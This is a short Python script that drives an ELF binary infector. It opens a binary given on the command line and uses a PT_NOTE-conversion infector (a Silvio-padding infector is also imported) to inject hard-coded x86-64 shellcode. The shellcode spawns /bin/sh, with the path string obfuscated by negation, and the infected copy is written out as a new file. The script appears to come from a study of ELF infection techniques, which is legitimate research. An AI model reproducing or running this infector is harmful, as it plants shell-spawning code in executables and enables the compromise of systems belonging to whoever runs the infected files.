#! /usr/bin/python3
import argparse
import struct

from ELF.elf import Elf
from infections.silvio_padding import SilvioPaddingInfector
from infections.note_conversion import NoteInfector

FILE_NAME_ARG = 'file_name'


def parse_args():
    parser = argparse.ArgumentParser(description='Parse a ELF file ELF header.')
    parser.add_argument('file_name', type=str, help='The given ELF file-name.')
    args = parser.parse_args()
    return vars(args)


def main():
    arguments = parse_args()

    f = open(arguments.get(FILE_NAME_ARG), 'rb')
    elf_obj = Elf(f)
    infector = NoteInfector()
    infector.infect(elf_obj, 'new_simple', b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')

    f.close()
   
if __name__=='__main__':
	main()